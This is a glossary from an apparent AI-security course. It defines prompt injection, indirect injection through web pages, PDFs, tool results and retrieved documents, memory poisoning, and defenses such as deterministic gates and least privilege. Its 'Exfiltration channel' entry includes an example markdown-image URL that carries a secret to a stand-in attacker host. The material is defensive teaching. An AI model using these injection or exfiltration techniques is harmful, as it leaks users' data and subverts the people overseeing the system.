# AI-Forward Glossary

The canonical language for this workspace. Terms are added only once the learner
can use them correctly. All lessons and reference cards adhere to these definitions.

## Terms

**Token**:
The model's unit of text — roughly ¾ of a word. Models read and generate tokens, not
characters or words.
_Avoid_: word, character

**Context window**:
The finite token budget for a single model call. Holds the system prompt, conversation
history, retrieved data, and the reply being generated — all sharing one limit.
_Avoid_: memory, prompt size

**Stateless**:
The property that a model call retains no memory between calls. Any "memory" of a
conversation is the application resending the transcript each turn.
_Avoid_: sessionless, no-cache

**Model call**:
One request to a language model: send the entire context as a flat token string, receive
a sampled continuation. The primitive every AI system is built from. See [[the-model-call]].
_Avoid_: query, prompt (as a verb)

**Sampling**:
Drawing the next token from a probability distribution rather than picking deterministically.
The reason outputs vary and why a confident continuation can still be wrong.
_Avoid_: guessing, randomness

**Hallucination**:
A confident, plausible-sounding output that is false. Not a malfunction — the expected
result of [[Sampling]] a next token with no notion of truth.
_Avoid_: lie, bug, error

**Prompt injection**:
An attack in which untrusted text entering the context window carries instructions the
model may follow. Architectural, because instructions and data share one token stream
(OWASP LLM01). See [[the-model-call]].
_Avoid_: jailbreak (related but distinct), hacking

**Direct injection**:
Prompt injection where the user themself supplies the malicious instruction.

**Indirect injection**:
Prompt injection where the payload rides in on content the model reads on the user's
behalf — a web page, PDF, email, or tool result.

**Message role**:
The label (`system`, `user`, `assistant`) attached to each turn sent to the model. Organizes
a prompt and is a *learned prior* the model tends to respect — but not a security boundary,
since every role renders into one flat token stream. See [[the-model-call]].
_Avoid_: permission level, privilege boundary

**Delimiting**:
Marking untrusted text as data (e.g. wrapping it in `<untrusted_data>` tags) so the model is
less likely to treat it as commands. Raises the cost of [[Prompt injection]] but does not
prevent it — the text still shares the token stream. A probabilistic measure, not a wall.
_Avoid_: sanitizing, escaping (related but distinct)

**Deterministic gate**:
A check in your own code (not the model) that screens input or output before a privileged
action — e.g. a substring test that blocks a leaked secret. Absolute where prompt wording is
probabilistic, because code has no instructions to be argued out of.
_Avoid_: filter, guardrail (a guardrail LLM is itself injectable)

**Least privilege**:
Granting the model (and its tools) only the minimum data and authority needed, so a successful
injection can do little. Strongest form: never give the model the secret or the ability to act
in the first place — "you can't leak what you were never told."
_Avoid_: sandboxing (related but broader)

**Defense in depth**:
Layering independent defenses so no single failure is fatal — for injection: delimiting →
input/output validation → least-privilege tools → human-in-the-loop. Assumes upper layers will
eventually be bypassed and caps what a bypass can cost.
_Avoid_: redundancy

**Tool call (tool use)**:
The model emitting a structured *request* to run a named function with arguments, signalled by
`stop_reason: "tool_use"`. It is a request, not an action — the model runs nothing; your code
decides whether and how to execute it. Because it is attacker-hijackable, the tool call is the
*danger*, and the seam where you install a defense. See [[the-model-call]].
_Avoid_: function execution, the model running code

**Excessive agency**:
The risk that a model's tool access lets manipulated or unexpected output cause real damage
(OWASP LLM06). Root causes = too much functionality, permission, or autonomy. Countered by
minimum-necessary tools, granular (not open-ended) scopes, and [[Human-in-the-loop]] on
high-impact actions.
_Avoid_: over-permissioning (a cause, not the risk itself)

**Human-in-the-loop**:
A deterministic approval step in your code that pauses a high-impact tool call for explicit
human confirmation before it runs — the fourth layer of [[Defense in depth]]. A [[Deterministic
gate]] whose check is a person, not a substring test.
_Avoid_: manual review (broader), oversight

**Enforce authz in code**:
The rule that authorization for any action lives in your own code (or downstream systems), never
in the model's judgement — because the model's input is attacker-controlled and its behaviour is
non-deterministic. Generalizes [[Least privilege]] from "where the key lives" to "where the
authority to act lives."
_Avoid_: trust the model, prompt-level permissions

**Agent loop**:
Running the model repeatedly — call → execute the requested [[Tool call (tool use)]] → feed the
result back → call again — until it stops asking for tools (`stop_reason: "end_turn"`). Each
iteration wires an untrusted tool *result* straight into the model's next (possibly privileged)
decision, so the [[Deterministic gate]] must fire on *every* pass, not once.
_Avoid_: chatbot, single request/response

**Workflow vs. agent**:
Two ways to use an LLM (Anthropic, "Building Effective Agents"). A *workflow* orchestrates the
model through predefined code paths; an *agent* lets the model dynamically direct its own tool use
in a loop. Agents buy flexibility at the cost of predictability — prefer the simplest thing that
works, and don't reach for an agent when a workflow suffices.
_Avoid_: "agent = anything with an LLM"

**Compounding errors**:
In an agent loop, a mistake (or an injected instruction) at step N becomes trusted input at step
N+1, so errors accumulate across iterations instead of being caught. The reason autonomy raises
[[Excessive agency]] risk and why a [[Loop cap]] plus a per-iteration gate matter.
_Avoid_: one-off mistake, single-step error

**Loop cap**:
A hard maximum on agent-loop iterations (`for step in range(10)`), never `while True`. A
deterministic bound on blast radius and cost if the model gets stuck or is driven off course —
the loop's own least-privilege control.
_Avoid_: timeout, rate limit

**Retrieval-augmented generation (RAG)**:
Supplementing a [[Model call]] by retrieving relevant external documents and inserting them into the
[[Context window]] before generating — grounding answers in private/fresh data without retraining.
Security consequence: a retrieved chunk is untrusted text entering context, so RAG is an
[[Indirect injection]] surface — the same spine as a poisoned tool result, just arriving as a document.
_Avoid_: search, database lookup (RAG is retrieval *and* generation)

**Exfiltration channel**:
Any path by which model *output* can carry data out of the system — classically an auto-loaded
markdown image URL (`![x](https://attacker/?d=SECRET)`, the EchoLeak vector). Closed with a
[[Deterministic gate]] on the output that *denies* (does not sanitize) any reply containing an
outbound channel — code reading the bytes leaving, indifferent to how the model was persuaded.
_Avoid_: data leak (that's the outcome), output filter (too narrow)

**Eval**:
An input plus grading logic on the output, scored over a *set* of cases — the test suite for a
component that never behaves the same way twice ([[Sampling]]). One run proves nothing; an eval
measures behaviour across many. The third consequence of a [[Model call]] (*Sampled → Evals*).
_Avoid_: test (too narrow — one case), benchmark (a published eval, not the technique)

**Code-based grader**:
A deterministic check on the model's output — substring match, regex, JSON-schema validation.
Fast, cheap, repeatable, and **un-injectable** (it's your code, not a model), so it's the grader
of choice for anything security-critical. Brittle to valid-but-unexpected phrasings.
_Avoid_: unit test (an eval case *uses* one, but grades a stochastic output)

**Model-based grader (LLM-as-judge)**:
Using a second [[Model call]] to grade an output against a rubric — for fuzzy qualities (clarity,
tone, helpfulness) no [[Code-based grader]] can score. Flexible and scalable but **non-deterministic
and itself injectable**, so it needs *calibration* against human labels and must never grade a
security decision. Delimit the text it judges.
_Avoid_: automatic grader (hides that it's a model), objective score (it isn't)

**pass@k**:
Succeeds if **at least one** of k trials succeeds; rises with k. The **attacker's** bar — an
injection only has to land once in k attempts to win. See [[0006-evals-watched-wall-passk-vs-passhatk]].
_Avoid_: pass rate, accuracy (those average; pass@k is "any success")

**pass^k**:
Succeeds only if **all** k trials succeed; falls with k. The **defender's** bar — a
[[Deterministic gate]] must hold on *every* run where the attack fired, not just on average. A wall
that fails on any run is a curtain.
_Avoid_: reliability %, uptime (pass^k is all-or-nothing over k)

**Confusion matrix**:
The 2×2 tally of a binary classifier's calls against ground truth — **TP** (flagged, real), **FP**
(flagged, not real), **FN** (missed a real one), **TN** (correctly ignored). The raw material every
triage metric is computed from. For a security triage agent the costs are wildly asymmetric: an FN
is a *shipped exploit*, an FP is *alert fatigue*. See [[0007-triage-scorecard-a-perfect-score-has-no-teeth]].
_Avoid_: accuracy table (accuracy hides the asymmetry)

**Precision**:
TP / (TP + FP) — of everything the agent flagged, the fraction that was real. Protects human
**time**: low precision = [[Confusion matrix|alert fatigue]]. Says nothing about what was missed.
_Avoid_: accuracy

**Recall**:
TP / (TP + FN) — of everything that was actually real, the fraction the agent caught. Protects the
**system**: low recall = shipped exploits. The metric a security triage deliberately biases toward.
_Avoid_: coverage, accuracy

**F-beta score**:
A single score blending [[Precision]] and [[Recall]], with β setting their weight. **β>1 weights
recall harder** — **F2** (β=2) is the triage default because a false negative is catastrophic; F1
(β=1) weights them equally. Collapses two numbers into one you can regression-test.
_Avoid_: F1 (that's only the β=1 case), accuracy

**Ingress / egress**:
The two directions data crosses your boundary. **Ingress** = untrusted text entering the prompt
(documents, tool results, memory). **Egress** = what the model emits and what your code then *does*
with it. Defenses on ingress filter; defenses on egress constrain. Only the second is provable.
_Avoid_: input/output (too vague to carry the security distinction)

**The enumeration asymmetry**:
You cannot enumerate the inputs; you can enumerate the actions. The input space is infinite and
attacker-chosen — patch `n` bypasses and `n+∞` remain, and the attacker needs one win ([[pass@k]]).
The action space is finite because *you authored it* (`delete_file`, `RAISE`, `NEEDS_REVIEW`), so a
constraint on it can be asserted for every case. This is why every real defense in this course sits
on the [[Ingress / egress|egress]] side. See [[0012-the-enumeration-asymmetry]].
_Avoid_: "sanitize the input" as a wall (it is a speed bump you own, never a wall you can prove)

**Sanitization**:
Filtering untrusted text on [[Ingress / egress|ingress]] — stripping URLs, blocking marker phrases.
A legitimate defense-in-depth *layer* and never a boundary: it is a blocklist over an infinite space,
so it can only be verified against the strings you thought of. The blocklist failure mode is the same
one that killed the v3 tripwire.
_Avoid_: treating it as equivalent to a gate

**Context rot**:
As tokens accumulate in the context window, the model's ability to accurately recall information from
it *decreases* — quality degrades well **before** the hard limit is reached, because attention is a
finite budget spread over n² pairwise token relationships. Fitting is not the same as working.
_Avoid_: "running out of context" (that's the cruder, separate failure)

**Context engineering**:
Curating and maintaining the optimal set of tokens during inference — the superset of prompt
engineering. The goal is the *smallest* set of high-signal tokens, not the largest set that fits.
_Avoid_: prompt engineering (that's one part of it)

**Agentic memory**:
Notes the agent writes to storage outside the context window and pulls back in later sessions. Not a
model feature — it is application code choosing what past text re-enters the string.
_Avoid_: "the model remembers" (it does not; [[Stateless]])

**Memory poisoning (ASI06)**:
Untrusted content written into persistent agent state, which then replays in every later session —
including clean sessions with no attacker present. Distinguishing property: the attack window and the
damage window are **separated in time**, so detection may outlive the logs. Defended by constraining
what a memory entry may *influence* (ordering and presentation, never a verdict or a privilege), plus
provenance, integrity and rollback. See [[0008-memory-and-the-permanent-injection]].
_Avoid_: prompt injection (that one expires; this one does not)
